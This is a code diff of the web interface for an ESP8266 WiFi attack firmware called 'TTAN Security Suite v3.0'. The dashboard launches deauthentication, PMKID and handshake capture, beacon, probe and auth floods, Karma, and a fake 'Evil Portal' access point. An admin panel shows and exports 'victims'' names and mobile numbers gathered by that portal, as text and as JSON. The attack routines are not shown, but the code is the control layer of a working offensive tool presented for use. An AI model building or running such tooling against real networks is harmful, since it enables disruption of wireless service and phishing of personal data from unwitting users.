-      page += "<b style='color:#0f0;font-size:1.2em'>⚡ CAPTURE ACTIVE</b><br>";
-      page += "<div style='margin-top:10px;color:#0ff'>";
-      page += "Channel: <b>" + String(state.targetChannel) + "</b><br>";
-      page += "Packets: <b>" + String(state.packetCount) + "</b><br>";
-      page += "EAPOL frames: <b>" + String(state.eapolCount) + "</b><br>";
-      page += "Complete handshakes: <b>" + String(state.handshakeCount) + "</b><br>";
-      page += "Runtime: <b>" + Utils::formatUptime(millis() - state.startTime) + "</b>";
-      page += "</div></div>";
-    } else {
-      page += "<div class='info' style='border-color:#666;color:#666'>";
-      page += "<b>⭕ CAPTURE INACTIVE</b><br>";
-      page += "Start handshake capture from the main dashboard.";
-      page += "</div>";
+
+  void streamDashboard() {
+    ESP8266WebServer* srv = state.server;
+    srv->setContentLength(CONTENT_LENGTH_UNKNOWN);
+    srv->send(200, String("text/html"), "");
+
+    String s;
+    s.reserve(512);
+
+    s = String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>"
+        "<meta charset='UTF-8'><title>TTAN Security Suite</title><style>");
+    s += FPSTR(DASH_CSS);
+    s += String("</style></head><body><div class='w'>");
+    srv->sendContent(s);
+
+    bool anyActive = state.deauthActive || state.pmkidActive || state.portalActive ||
+                     state.snifferActive || state.handshakeActive || state.beaconFloodActive ||
+                     state.probeFloodActive || state.authFloodActive || state.karmaActive;
+
+    s  = String("<h1>&#9888; TTAN SECURITY SUITE v3.0</h1>");
+    s += String("<div style='text-align:center;color:#ff0;font-size:.9em;margin-bottom:15px'>Enhanced WiFi Penetration Testing</div>");
+    if (anyActive) s += String("<div class='warn'>&#9889; ATTACK IN PROGRESS</div>");
+    srv->sendContent(s);
+
+    // System status
+    s  = String("<div class='b'><b>&#9881; SYSTEM STATUS</b><br>");
+    s += String("<div class='st'>Clients: ") + String(WiFi.softAPgetStationNum()) + String("</div>");
+    s += String("<div class='st'>Uptime: ") + Utils::formatUptime(millis() - state.startTime) + String("</div>");
+    s += String("<div class='st'>Free RAM: ") + String(ESP.getFreeHeap() / 1024) + String(" KB</div>");
+    s += String("<div class='st'>Requests: ") + String(state.totalRequests) + String("</div>");
+    s += String("<div class='st'>Errors: ") + String(state.errorCount) + String("</div>");
+    if (state.errorCount > 0)
+      s += String("<div class='err'>Last: ") + Utils::htmlEncode(state.lastError) + String("</div>");
+    s += String("</div>");
+    srv->sendContent(s);
+
+    // Recon
+    s  = String("<div class='b'><b>&#128270; RECONNAISSANCE</b><div class='g'>");
+    s += String("<a href='/s' class='btn c1'>WiFi Scan</a>");
+    s += String("<a href='/h' class='btn c1'>Host Scan</a>");
+    s += String("<a href='/x' class='btn c1'>Clear Logs</a>");
+    s += String("<a href='/stop' class='btn c4'>Stop All</a>");
+    s += String("<a href='/r' class='btn c3'>Reboot</a>");
+    s += String("</div></div>");
+    srv->sendContent(s);
+
+    // Attacks
+    String boxClass = anyActive ? String("b a") : String("b");
+    s  = String("<div class='") + boxClass + String("'>");
+    s += String("<b>&#9876; ATTACK VECTORS</b><br>");
+    s += String("Channel: <select id='ch'>");
+    for (int i = 1; i<=13; i++) {
+      s += String("<option"); if (i == state.targetChannel) s += String(" selected");
+      s += String(">") + String(i) + String("</option>");
     }
-    
-    page += "<div class='count'>📊 Total Handshakes: " + String(state.handshakeCount) + "</div>";
-    
-    page += "<div class='btn-group'>";
-    page += "<a href='#' class='btn btn-export' onclick='toggleExport();return false'>📄 Export as Text</a>";
-    page += "<a href='/handshake/clear' class='btn btn-clear' onclick='return confirm(\"Clear all captured handshakes?\")'>🗑️ Clear All Data</a>";
-    page += "<a href='http://" + WiFi.softAPIP().toString() + "' class='btn btn-back'>⬅️ Back to Dashboard</a>";
-    page += "</div>";
-    
-    page += "<div id='exportSection' class='export-section'>";
-    page += "<h3 style='color:#0ff'>Handshake Export:</h3>";
-    page += "<textarea id='exportText' readonly>";
-    
+    s += String("</select> <label><input type='checkbox' id='hop'> Auto-hop</label><div class='g' style='margin-top:10px'>");
+    srv->sendContent(s);
+
+    if (state.deauthActive)
+      srv->sendContent(String("<a href='/ds' class='btn c3'>&#9632; STOP Deauth</a>"));
+    else
+      srv->sendContent(String("<span class='btn c2 off'>Deauth (Scan)</span>"));
+
+    if (state.pmkidActive)
+      srv->sendContent(String("<a href='/ps' class='btn c3'>&#9632; STOP PMKID</a>"));
+    else
+      srv->sendContent(String("<a href='#' class='btn c2' onclick='startPMKID()'>&#9679; PMKID</a>"));
+
+    if (state.handshakeActive) {
+      s  = String("<a href='/hs' class='btn c3'>&#9632; STOP Handshake</a>");
+      s += String("<a href='/handshake' class='btn c1' target='_blank'>View");
+      if (state.handshakeCount > 0) s += String("<span class='badge'>") + String(state.handshakeCount) + String("</span>");
+      s += String("</a>");
+    } else {
+      s = String("<a href='#' class='btn c2' onclick='startHS()'>&#9679; Handshake</a>");
+    }
+    srv->sendContent(s);
+
+    if (state.portalActive) {
+      s  = String("<a href='/es' class='btn c3'>&#9632; STOP Portal</a>");
+      s += String("<a href='http://") + WiFi.softAPIP().toString() + String(":") + String(Config::ADMIN_PORT) + String("/admin' class='btn c2' target='_blank'>Victims");
+      if (state.credentialCount > 0) s += String("<span class='badge'>") + String(state.credentialCount) + String("</span>");
+      s += String("</a>");
+    } else {
+      s = String("<a href='#' class='btn c2' onclick='startPortal()'>&#128526; Evil Portal</a>");
+    }
+    srv->sendContent(s);
+
+    if (state.snifferActive)
+      srv->sendContent(String("<a href='/ns' class='btn c3'>&#9632; STOP Sniffer</a>"));
+    else
+      srv->sendContent(String("<a href='#' class='btn c2' onclick='startSniff()'>&#128225; Sniffer</a>"));
+
+    if (state.beaconFloodActive)
+      srv->sendContent(String("<a href='/bs' class='btn c3'>&#9632; STOP Beacon</a>"));
+    else
+      srv->sendContent(String("<a href='#' class='btn c2' onclick='startBeacon()'>&#128225; Beacon Flood</a>"));
+
+    if (state.probeFloodActive)
+      srv->sendContent(String("<a href='/prs' class='btn c3'>&#9632; STOP Probe</a>"));
+    else
+      srv->sendContent(String("<a href='#' class='btn c2' onclick='startProbe()'>&#128225; Probe Flood</a>"));
+
+    if (state.authFloodActive)
+      srv->sendContent(String("<a href='/aus' class='btn c3'>&#9632; STOP Auth</a>"));
+    else
+      srv->sendContent(String("<span class='btn c2 off'>Auth Flood (Scan)</span>"));
+
+    if (state.karmaActive)
+      srv->sendContent(String("<a href='/ks' class='btn c3'>&#9632; STOP Karma</a>"));
+    else
+      srv->sendContent(String("<a href='#' class='btn c2' onclick='startKarma()'>&#128526; Karma</a>"));
+
+    srv->sendContent(String("</div></div>"));
+
+    // Active status boxes
+    if (state.deauthActive) {
+      srv->sendContent(String("<div class='b a'><b>&#9889; DEAUTH</b><br>") + state.deauthData + String("</div>"));
+    }
+    if (state.pmkidActive) {
+      s  = String("<div class='b a'><b>&#128272; PMKID</b><br>") + state.pmkidData;
+      s += String("<br>Pkts: ") + String(state.packetCount) + String(" | EAPOL: ") + String(state.eapolCount) + String("</div>");
+      srv->sendContent(s);
+    }
+    if (state.handshakeActive) {
+      s  = String("<div class='b a'><b>&#128272; HANDSHAKE</b><br>") + state.handshakeData;
+      s += String("<br>Pkts: ") + String(state.packetCount) + String(" | EAPOL: ") + String(state.eapolCount);
+      s += String(" | Complete: ") + String(state.handshakeCount) + String("</div>");
+      srv->sendContent(s);
+    }
+    if (state.portalActive) {
+      s  = String("<div class='b a'><b>&#128526; PORTAL</b><br>") + state.credentialData;
+      s += String("<br><b>Admin:</b> http://") + WiFi.softAPIP().toString() + String(":") + String(Config::ADMIN_PORT) + String("/admin</div>");
+      srv->sendContent(s);
+    }
+    if (state.snifferActive) {
+      srv->sendContent(String("<div class='b a'><b>&#128225; SNIFFER</b><br>CH: ") + String(state.targetChannel) +
+                       String(" | Pkts: ") + String(state.packetCount) + String("</div>"));
+    }
+    if (state.beaconFloodActive) {
+      srv->sendContent(String("<div class='b a'><b>&#128225; BEACON</b><br>") + state.beaconData +
+                       String(" | Sent: ") + String(state.beaconCount) + String("</div>"));
+    }
+    if (state.probeFloodActive) {
+      srv->sendContent(String("<div class='b a'><b>&#128225; PROBE</b><br>") + state.probeData +
+                       String(" | Sent: ") + String(state.probeCount) + String("</div>"));
+    }
+    if (state.authFloodActive) {
+      srv->sendContent(String("<div class='b a'><b>&#128225; AUTH</b><br>") + state.authData +
+                       String(" | Sent: ") + String(state.authCount) + String("</div>"));
+    }
+    if (state.karmaActive) {
+      srv->sendContent(String("<div class='b a'><b>&#128526; KARMA</b><br>") + state.karmaData +
+                       String(" | Responses: ") + String(state.karmaCount) + String("</div>"));
+    }
+
+    if (state.scanData.length() > 0)
+      srv->sendContent(String("<div class='b'><b>&#128270; SCAN</b><br>") + state.scanData + String("</div>"));
+    if (state.hostData.length() > 0)
+      srv->sendContent(String("<div class='b'><b>&#128270; HOSTS</b><br>") + state.hostData + String("</div>"));
+
+    s  = String("</div><script>");
+    s += String("function gc(){var c=document.getElementById('ch').value;var h=document.getElementById('hop').checked;return'&c='+c+(h?'&hop=1':'')}");
+    s += String("function atk(m,c,s){if(confirm('Deauth '+s+'?'))location='/d?m='+m+'&c='+c+'&s='+encodeURIComponent(s)}");
+    s += String("function atk2(m,c){if(confirm('Auth flood '+m+'?'))location='/au?m='+m+'&c='+c}");
+    s += String("function startPMKID(){location='/p'+gc()}");
+    s += String("function startHS(){location='/hsh'+gc()}");
+    s += String("function startPortal(){var s=prompt('Fake SSID:','Free_WiFi');if(s)location='/e?s='+encodeURIComponent(s)}");
+    s += String("function startSniff(){location='/n'+gc()}");
+    s += String("function startBeacon(){var s=prompt('Beacon SSID:','FakeAP');if(s){var c=document.getElementById('ch').value;location='/b?s='+encodeURIComponent(s)+'&c='+c}}");
+    s += String("function startProbe(){var s=prompt('Probe SSID:','TargetNetwork');if(s){var c=document.getElementById('ch').value;location='/pr?s='+encodeURIComponent(s)+'&c='+c}}");
+    s += String("function startKarma(){var s=prompt('Karma SSID:','Free_WiFi');if(s)location='/k?s='+encodeURIComponent(s)}");
+    s += String("</script></body></html>");
+    srv->sendContent(s);
+    srv->sendContent("");
+  }
+
+  String handshakePage() {
+    String p;
+    p.reserve(2000);
+    p += String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta charset='UTF-8'>");
+    p += String("<title>Handshake Capture</title><style>") + String(FPSTR(HS_CSS)) + String("</style></head><body><div class='w'>");
+    p += String("<h1>&#128272; HANDSHAKE CAPTURE</h1>");
+
+    if (state.handshakeActive) {
+      p += String("<div class='b'><b style='color:#0f0;font-size:1.2em'>&#9889; CAPTURE ACTIVE</b><br>");
+      p += String("<span style='color:#0ff'>CH: <b>") + String(state.targetChannel) + String("</b> | ");
+      p += String("Pkts: <b>") + String(state.packetCount) + String("</b> | ");
+      p += String("EAPOL: <b>") + String(state.eapolCount) + String("</b> | ");
+      p += String("Complete: <b>") + String(state.handshakeCount) + String("</b></span></div>");
+    } else {
+      p += String("<div class='b' style='border-color:#666;color:#666'><b>&#11044; INACTIVE</b></div>");
+    }
+
+    p += String("<div class='cnt'>&#128202; Handshakes: ") + String(state.handshakeCount) + String("</div>");
+    p += String("<div class='g'>");
+    p += String("<a href='#' class='btn e1' onclick='toggleEx();return false'>Export</a>");
+    p += String("<a href='/handshake/clear' class='btn e2' onclick='return confirm(\"Clear?\")'>Clear</a>");
+    p += String("<a href='/dash' class='btn e3'>Dashboard</a></div>");
+
+    p += String("<div id='ex' class='xs'><h3 style='color:#0ff'>Export:</h3><textarea id='et' readonly>");
     for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
       if (state.handshakes[i].complete) {
-        page += "Handshake #" + String(i + 1) + " from " + Utils::macToString(state.handshakes[i].bssid) + "\n";
-        page += "Frame count: " + String(state.handshakes[i].frameCount) + "\n";
-        page += "Frame lengths: ";
-        for (int j = 0; j < state.handshakes[i].frameCount; j++) {
-          page += String(state.handshakes[i].frameLengths[j]);
-          if (j < state.handshakes[i].frameCount - 1) page += ", ";
-        }
-        page += "\n\n";
+        p += String("HS #") + String(i+1) + String(" BSSID=") + Utils::macToStr(state.handshakes[i].bssid);
+        p += String(" Frames=") + String(state.handshakes[i].frameCount) + String("\n");
       }
     }
-    
-    page += "</textarea>";
-    page += "<button class='btn btn-export' style='margin-top:10px' onclick='copyToClipboard()'>📋 Copy to Clipboard</button>";
-    page += "</div>";
-    
-    page += "<h2 style='color:#0f0;margin-top:30px;border-bottom:2px solid #0f0;padding-bottom:10px'>📝 Captured Handshakes</h2>";
-    
+    p += String("</textarea><button class='btn e1' style='margin-top:10px' onclick='cp()'>Copy</button></div>");
+
     if (state.handshakeCount > 0) {
       for (int i = 0; i < Config::MAX_HANDSHAKES; i++) {
         if (state.handshakes[i].complete) {
-          page += "<div class='handshake'>";
-          page += "<b style='color:#0f0'>Handshake #" + String(i + 1) + "</b><br>";
-          page += "<span style='color:#0ff'>BSSID: " + Utils::macToString(state.handshakes[i].bssid) + "</span><br>";
-          page += "<span style='color:#ff0'>Frame count: " + String(state.handshakes[i].frameCount) + "</span>";
-          page += "</div>";
+          p += String("<div class='hs'><b style='color:#0f0'>HS #") + String(i+1) + String("</b><br>");
+          p += String("<span style='color:#0ff'>BSSID: ") + Utils::macToStr(state.handshakes[i].bssid) + String("</span><br>");
+          p += String("<span style='color:#ff0'>Frames: ") + String(state.handshakes[i].frameCount) + String("</span></div>");
         }
       }
     } else {
-      page += "<div class='empty'> No handshakes captured yet.<br><br>";
-      page += "The capture must be active and a client must authenticate to the network.</div>";
+      p += String("<div class='empty'>No handshakes captured yet.</div>");
     }
-    
-    page += "</div>";
-    page += "<script>";
-    page += "function toggleExport(){";
-    page += "var section=document.getElementById('exportSection');";
-    page += "section.classList.toggle('show');}";
-    page += "function copyToClipboard(){";
-    page += "var text=document.getElementById('exportText');";
-    page += "text.select();";
-    page += "document.execCommand('copy');";
-    page += "alert('Copied to clipboard!');}";
-    page += "</script>";
-    page += "</body></html>";
-    
-    return page;
+
+    p += String("</div><script>");
+    p += String("function toggleEx(){document.getElementById('ex').classList.toggle('show')}");
+    p += String("function cp(){var t=document.getElementById('et');t.select();document.execCommand('copy');alert('Copied!')}");
+    p += String("</script></body></html>");
+    return p;
   }
 }
+
+// ---------- Admin Handlers ----------
 
 namespace AdminHandlers {
-  void handleAdminRoot() {
-    String page = "<!DOCTYPE html><html><head>";
-    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
-    page += "<meta charset='UTF-8'>";
-    page += "<title>Admin Panel - Captured Data</title><style>";
-    page += "body{font-family:'Courier New',monospace;background:#1a0000;color:#f00;padding:20px;margin:0}";
-    page += ".wrap{max-width:1000px;margin:0 auto}";
-    page += "h1{color:#f00;text-shadow:0 0 15px #f00;text-align:center;font-size:2em;border-bottom:2px solid #f00;padding-bottom:10px}";
-    page += ".info{background:#0f1419;padding:15px;border:2px solid #f00;border-radius:8px;margin:20px 0;box-shadow:0 0 20px rgba(255,0,0,0.3)}";
-    page += ".cred{background:#0f1419;padding:15px;margin:10px 0;border-radius:8px;border-left:5px solid #f00;box-shadow:0 0 15px rgba(255,0,0,0.2);word-wrap:break-word}";
-    page += ".count{color:#ff0;font-size:1.3em;text-align:center;margin:20px 0;padding:15px;background:#1a1a00;border:2px solid #ff0;border-radius:8px}";
-    page += ".time{color:#0ff;font-size:0.85em}";
-    page += ".empty{text-align:center;color:#ff0;padding:40px;font-size:1.1em}";
-    page += ".btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px;margin:20px 0}";
-    page += ".btn{padding:15px;text-align:center;border:2px solid;border-radius:8px;text-decoration:none;display:block;font-weight:bold;transition:all 0.3s;cursor:pointer}";
-    page += ".btn-export{background:#001a1a;color:#0ff;border-color:#0ff}";
-    page += ".btn-export:hover{background:#0ff;color:#000}";
-    page += ".btn-clear{background:#1a0000;color:#f00;border-color:#f00}";
-    page += ".btn-clear:hover{background:#f00;color:#fff}";
-    page += ".btn-back{background:#1a1a00;color:#ff0;border-color:#ff0}";
-    page += ".btn-back:hover{background:#ff0;color:#000}";
-    page += ".stat{display:inline-block;margin:10px;padding:10px 20px;background:#0a0e27;border-radius:5px;border:1px solid #0f0;color:#0f0}";
-    page += "textarea{width:100%;min-height:300px;background:#000;color:#0f0;border:2px solid #0f0;padding:10px;font-family:'Courier New',monospace;font-size:0.9em;border-radius:5px}";
-    page += ".export-section{margin:20px 0;display:none}";
-    page += ".export-section.show{display:block}";
-    page += "</style></head><body><div class='wrap'>";
-    
-    page += "<h1>🔐 ADMIN PANEL - PORT " + String(Config::ADMIN_PORT) + "</h1>";
-    
+
+  void handleRoot() {
+    ESP8266WebServer* srv = state.adminServer;
+    srv->setContentLength(CONTENT_LENGTH_UNKNOWN);
+    srv->send(200, String("text/html"), "");
+
+    String s;
+    s.reserve(400);
+    s  = String("<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta charset='UTF-8'>");
+    s += String("<title>Admin Panel</title><style>") + String(FPSTR(ADMIN_CSS)) + String("</style></head><body><div class='w'>");
+    s += String("<h1>&#128272; ADMIN PANEL</h1>");
+    srv->sendContent(s);
+
     if (state.portalActive) {
-      page += "<div class='info'>";
-      page += "<b style='color:#f00;font-size:1.2em'>⚡ PORTAL ACTIVE</b><br>";
-      page += "<div style='margin-top:10px;color:#0f0'>";
-      page += "Fake SSID: <b>" + state.currentPortalSSID + "</b><br>";
-      page += "Portal IP: <b>" + WiFi.softAPIP().toString() + "</b><br>";
-      page += "Victims Connected: <b>" + String(WiFi.softAPgetStationNum()) + "</b><br>";
-      page += "Runtime: <b>" + Utils::formatUptime(millis() - state.startTime) + "</b>";
-      page += "</div></div>";
+      s  = String("<div class='b'><b style='color:#f00;font-size:1.2em'>&#9889; PORTAL ACTIVE</b><br>");
+      s += String("<span style='color:#0f0'>SSID: <b>") + Utils::htmlEncode(state.currentPortalSSID) + String("</b><br>");
+      s += String("Victims connected: <b>") + String(WiFi.softAPgetStationNum()) + String("</b></span></div>");
     } else {
-      page += "<div class='info' style='border-color:#666;color:#666'>";
-      page += "<b>⭕ PORTAL INACTIVE</b><br>";
-      page += "Start the Evil Portal from the main dashboard to capture victim information.";
-      page += "</div>";
+      srv->sendContent(String("<div class='b' style='border-color:#666;color:#666'><b>&#11044; PORTAL INACTIVE</b></div>"));
+      s = "";
     }
-    
-    page += "<div class='count'>📊 Total Victims: " + String(state.credentialCount) + "</div>";
-    
-    page += "<div class='btn-group'>";
-    page += "<a href='#' class='btn btn-export' onclick='toggleExport();return false'>📄 Export as Text</a>";
-    page += "<a href='/admin/json' class='btn btn-export' target='_blank'>📋 Export as JSON</a>";
-    page += "<a href='/admin/clear' class='btn btn-clear' onclick='return confirm(\"Clear all captured victim data?\")'>🗑️ Clear All Data</a>";
-    page += "<a href='http://" + WiFi.softAPIP().toString() + "' class='btn btn-back'>⬅️ Back to Dashboard</a>";
-    page += "</div>";
-    
-    page += "<div id='exportSection' class='export-section'>";
-    page += "<h3 style='color:#0ff'>Victim Data Export:</h3>";
-    page += "<textarea id='exportText' readonly>";
+    srv->sendContent(s);
+
+    s  = String("<div class='cnt'>&#128202; Total Victims: ") + String(state.credentialCount) + String("</div>");
+    s += String("<div class='g'>");
+    s += String("<a href='#' class='btn e1' onclick='toggleEx();return false'>Export</a>");
+    s += String("<a href='/admin/json' class='btn e1' target='_blank'>JSON</a>");
+    s += String("<a href='/admin/clear' class='btn e2' onclick='return confirm(\"Clear all?\")'>Clear</a>");
+    s += String("<a href='/dash' class='btn e3'>Dashboard</a></div>");
+    srv->sendContent(s);
+
+    s  = String("<div id='ex' class='xs'><h3 style='color:#0ff'>Export:</h3><textarea id='et' readonly>");
     for (int i = 0; i < state.credentialCount; i++) {
-      page += state.credentials[i] + "\n";
+      s += Utils::htmlEncode(state.creds[i].name) + String(" : ") + Utils::htmlEncode(state.creds[i].mobile) + String("\n");
     }
-    page += "</textarea>";
-    page += "<button class='btn btn-export' style='margin-top:10px' onclick='copyToClipboard()'>📋 Copy to Clipboard</button>";
-    page += "</div>";
-    
-    page += "<h2 style='color:#f00;margin-top:30px;border-bottom:2px solid #f00;padding-bottom:10px'>📝 Captured Victim Information</h2>";
-    
+    s += String("</textarea><button class='btn e1' style='margin-top:10px' onclick='cp()'>Copy</button></div>");
+    srv->sendContent(s);
+
     if (state.credentialCount > 0) {
-      for (int i = state.credentialCount - 1; i >= 0; i--) {  
-        page += "<div class='cred'>";
-        page += "<b style='color:#f00'>#" + String(state.credentialCount - i) + "</b><br>";
-        page += "<span style='color:#0f0'>" + state.credentials[i] + "</span>";
-        page += "</div>";
+      for (int i = state.credentialCount - 1; i >= 0; i--) {
+        s  = String("<div class='cd'><b style='color:#f00'>#") + String(state.credentialCount - i) + String("</b><br>");
+        s += String("<span style='color:#0f0'>Name: ") + Utils::htmlEncode(state.creds[i].name) + String("</span><br>");
+        s += String("<span style='color:#0ff'>Mobile: ") + Utils::htmlEncode(state.creds[i].mobile) + String("</span><br>");
+        s += String("<span style='color:#888'>") + Utils::formatUptime(state.creds[i].timestamp) + String("</span></div>");
+        srv->sendContent(s);
       }
     } else {
-      page += "<div class='empty'> No victim information captured yet.<br><br>";
-      page += "The portal must be active and victims must connect and enter their details.</div>";
+      srv->sendContent(String("<div class='empty'>No victims yet.</div>"));
     }
-    
-    page += "</div>";
-    page += "<script>";
-    page += "function toggleExport(){";
-    page += "var section=document.getElementById('exportSection');";
-    page += "section.classList.toggle('show');}";
-    page += "function copyToClipboard(){";
-    page += "var text=document.getElementById('exportText');";
-    page += "text.select();";
-    page += "document.execCommand('copy');";
-    page += "alert('Copied to clipboard!');}";
-    page += "</script>";
-    page += "</body></html>";
-    
-    state.adminServer->send(200, "text/html", page);
+
+    srv->sendContent(String("</div><script>function toggleEx(){document.getElementById('ex').classList.toggle('show')}"
+                     "function cp(){var t=document.getElementById('et');t.select();document.execCommand('copy');alert('Copied!')}</script></body></html>"));
+    srv->sendContent("");
   }
-  
-  void handleAdminJSON() {
-    String json = "{\"victims\":[";
-    
+
+  void handleJSON() {
+    String j;
+    j.reserve(512 + state.credentialCount * 80);
+    j = String("{\"victims\":[");
     for (int i = 0; i < state.credentialCount; i++) {
-      if (i > 0) json += ",";
-      
-      String cred = state.credentials[i];
-      int timeEnd = cred.indexOf(']');
-      int separator = cred.indexOf(" : ");
-      
-      String timestamp = cred.substring(1, timeEnd);
-      String name = cred.substring(timeEnd + 2, separator);
-      String mobile = cred.substring(separator + 3);
-      
-      json += "{";
-      json += "\"id\":" + String(i + 1) + ",";
-      json += "\"timestamp\":\"" + timestamp + "\",";
-      json += "\"name\":\"" + name + "\",";
-      json += "\"mobile\":\"" + mobile + "\"";
-      json += "}";
+      if (i > 0) j += ',';
+      j += String("{\"id\":") + String(i+1) + String(",");
+      j += String("\"name\":\"") + Utils::jsonEncode(state.creds[i].name) + String("\",");
+      j += String("\"mobile\":\"") + Utils::jsonEncode(state.creds[i].mobile) + String("\",");
+      j += String("\"time\":\"") + Utils::formatUptime(state.creds[i].timestamp) + String("\"}");
     }
-    
-    json += "],";
-    json += "\"total\":" + String(state.credentialCount) + ",";
-    json += "\"portal_active\":" + String(state.portalActive ? "true" : "false") + ",";
-    json += "\"portal_ssid\":\"" + state.currentPortalSSID + "\",";
-    json += "\"uptime\":\"" + Utils::formatUptime(millis() - state.startTime) + "\"";
-    json += "}";
-    
-    state.adminServer->send(200, "application/json", json);
+    j += String("],\"total\":") + String(state.credentialCount);
+    j += String(",\"portal_active\":") + String(state.portalActive ? "true" : "false");
+    j += String(",\"ssid\":\"") + Utils::jsonEncode(state.currentPortalSSID) + String("\"");
+    j += String(",\"uptime\":\"") + Utils::formatUptime(millis() - state.startTime) + String("\"");
+    j += String(",\"heap\":") + String(ESP.getFreeHeap());
+    j += '}';
+    state.adminServer->send(200, String("application/json"), j);
   }
-  
-  void handleAdminClear() {
+
+  void handleClear() {
     state.credentialCount = 0;
-    for (int i = 0; i < Config::MAX_CREDENTIALS; i++) {
-      state.credentials[i] = "";
-    }
-    
-    Serial.println("ADMIN: All victim data cleared");
-    
-    state.adminServer->sendHeader("Location", "/admin");
+    for (int i = 0; i < Config::MAX_CREDENTIALS; i++) state.creds[i] = Credential();
+    state.adminServer->sendHeader(String("Location"), String("/admin"));
     state.adminServer->send(302);
   }
-  
-  void handleAdminNotFound() {
-    state.adminServer->sendHeader("Location", "/admin");
+
+  void handleNotFound() {
+    state.adminServer->sendHeader(String("Location"), String("/admin"));
     state.adminServer->send(302);
   }
 }
 
+// ---------- Handlers ----------
+
 namespace Handlers {
+
   void handleRoot() {
     if (state.portalActive) {
-      state.server->send(200, "text/html", HTML::getCaptivePortal());
+      state.server->send(200, String("text/html"), HTML::captivePortal());
       return;
     }
-    
     state.totalRequests++;
-    
-    String page = "<!DOCTYPE html><html><head>";
-    page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
-    page += "<meta http-equiv='refresh' content='5'>";
-    page += "<meta charset='UTF-8'>";
-    page += "<title>TTAN Security Suite</title><style>";
-    page += "body{margin:0;padding:10px;font-family:'Courier New',monospace;background:#0a0e27;color:#0f0}";
-    page += ".wrap{max-width:1200px;margin:0 auto}";
-    page += "h1{text-align:center;color:#0f0;font-size:1.8em;margin:15px 0;text-shadow:0 0 10px #0f0}";
-    page += ".box{background:#0f1419;border:2px solid #0f0;border-radius:8px;padding:15px;margin:10px 0;box-shadow:0 0 15px rgba(0,255,0,0.2)}";
-    page += ".active{border-color:#f00;background:#1a0000;box-shadow:0 0 15px rgba(255,0,0,0.3)}";
-    page += ".warn{background:#ff0;color:#000;padding:10px;text-align:center;font-weight:bold;margin:10px 0;border-radius:5px;animation:pulse 1s infinite}";
-    page += "@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.7}}";
-    page += ".grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:8px;margin:12px 0}";
-    page += ".btn{padding:12px;text-align:center;border:2px solid;border-radius:6px;text-decoration:none;display:block;font-size:0.95em;font-weight:bold;transition:all 0.3s}";
-    page += ".b1{background:#001a1a;color:#0ff;border-color:#0ff}";
-    page += ".b1:hover{background:#0ff;color:#000}";
-    page += ".b2{background:#1a1a00;color:#ff0;border-color:#ff0}";
-    page += ".b2:hover{background:#ff0;color:#000}";
-    page += ".b3{background:#1a0000;color:#f00;border-color:#f00}";
-    page += ".b3:hover{background:#f00;color:#fff}";
-    page += ".b4{background:#1a001a;color:#f0f;border-color:#f0f}";
-    page += ".b4:hover{background:#f0f;color:#fff}";
-    page += "table{width:100%;border-collapse:collapse;font-size:0.85em;margin:10px 0}";
-    page += "th,td{border:1px solid #0f0;padding:8px;text-align:left}";
-    page += "th{background:#001a00;font-weight:bold}";
-    page += ".mini{padding:4px 8px;background:#0a5;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:0.75em}";
-    page += ".mini:hover{background:#0c7}";
-    page += ".stat{display:inline-block;margin:5px 10px;padding:8px 15px;background:#001a00;border-radius:5px;border:1px solid #0f0;color:#0f0}";
-    page += ".badge{background:#f00;color:#fff;padding:2px 6px;border-radius:10px;font-size:0.8em;margin-left:5px}";
-    page += ".error{color:#f00;font-size:0.9em;margin-top:10px}";
-    page += "</style></head><body><div class='wrap'>";
-    
-    page += "<h1> TTAN SECURITY SUITE v2.2 </h1>";
-    page += "<div style='text-align:center;color:#ff0;font-size:0.9em;margin-bottom:15px'> Enhanced WiFi Penetration Testing </div>";
-    
-    if (state.deauthActive || state.pmkidActive || state.portalActive || state.snifferActive || 
-        state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive) {
-      page += "<div class='warn'> ATTACK IN PROGRESS </div>";
-    }
-    
-    page += "<div class='box'><b> SYSTEM STATUS</b><br>";
-    page += "<div class='stat'> Clients: " + String(WiFi.softAPgetStationNum()) + "</div>";
-    page += "<div class='stat'> Uptime: " + Utils::formatUptime(millis() - state.startTime) + "</div>";
-    page += "<div class='stat'> Free RAM: " + String(ESP.getFreeHeap() / 1024) + " KB</div>";
-    page += "<div class='stat'> Requests: " + String(state.totalRequests) + "</div>";
-    page += "<div class='stat'> Errors: " + String(state.errorCount) + "</div>";
-    if (state.errorCount > 0) {
-      page += "<div class='error'>Last error: " + state.lastError + "</div>";
-    }
-    page += "</div>";
-    
-    page += "<div class='box'><b> RECONNAISSANCE</b><div class='grid'>";
-    page += "<a href='/s' class='btn b1'>WiFi Scan</a>";
-    page += "<a href='/h' class='btn b1'>Host Scan</a>";
-    page += "<a href='/x' class='btn b1'>Clear Logs</a>";
-    page += "<a href='/stop' class='btn b4'>Stop All</a>";
-    page += "<a href='/r' class='btn b3'>Reboot</a>";
-    page += "</div></div>";
-    
-    String boxClass = (state.deauthActive || state.pmkidActive || state.portalActive || state.snifferActive ||
-                      state.handshakeActive || state.beaconFloodActive || state.probeFloodActive || state.authFloodActive || state.karmaActive) ? "box active" : "box";
-    page += "<div class='" + boxClass + "'>";
-    page += "<b>⚔️ ATTACK VECTORS</b><br>";
-    page += "Channel: <select id='ch' style='background:#000;color:#0f0;border:1px solid #0f0;padding:5px'>";
-    for (int i = 1; i <= 13; i++) {
-      String selected = (i == state.targetChannel) ? " selected" : "";
-      page += "<option" + selected + ">" + String(i) + "</option>";
-    }
-    page += "</select><div class='grid' style='margin-top:10px'>";
-    
-    if (state.deauthActive) {
-      page += "<a href='/ds' class='btn b3'>STOP Deauth</a>";
-    } else {
-      page += "<span class='btn b2' style='opacity:0.6;cursor:not-allowed'>Deauth (Scan)</span>";
-    }
-    
-    if (state.pmkidActive) {
-      page += "<a href='/ps' class='btn b3'>STOP PMKID</a>";
-    } else {
